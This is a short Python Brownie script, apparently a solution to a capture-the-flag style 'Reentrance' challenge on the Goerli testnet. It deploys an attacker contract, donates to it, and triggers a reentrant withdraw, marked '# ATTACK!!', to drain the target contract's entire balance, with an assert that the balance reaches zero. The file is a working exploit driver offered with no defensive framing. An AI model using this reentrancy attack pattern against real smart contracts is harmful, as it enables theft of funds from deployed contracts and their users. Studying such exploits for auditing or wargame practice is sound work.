import brownie

from web3_hacking import config


def main():
    contract_address = "0x8966159094e8b991f55a2582DB0eEEf82AAdF071"

    brownie.network.disconnect()
    brownie.network.connect("goerli")

    brownie.accounts.add(config.ETH_ACCOUNT_PRIVATE_KEY)

    reentrance = brownie.Reentrance.at(contract_address)

    # Deploy Reentrance attacker contract
    reentrance_attacker = brownie.ReentranceAttacker.deploy(
        contract_address, {"from": brownie.accounts[0]}
    )

    total_balance = reentrance.balance()

    # Donate Reentrance Attacker contract
    reentrance.donate(
        reentrance_attacker.address,
        {"from": brownie.accounts[0].address, "value": total_balance},
    )

    # ATTACK!!
    reentrance_attacker.withdraw({"from": brownie.accounts[0].address})

    # Reentrance contract balance should be 0
    assert reentrance.balance() == 0
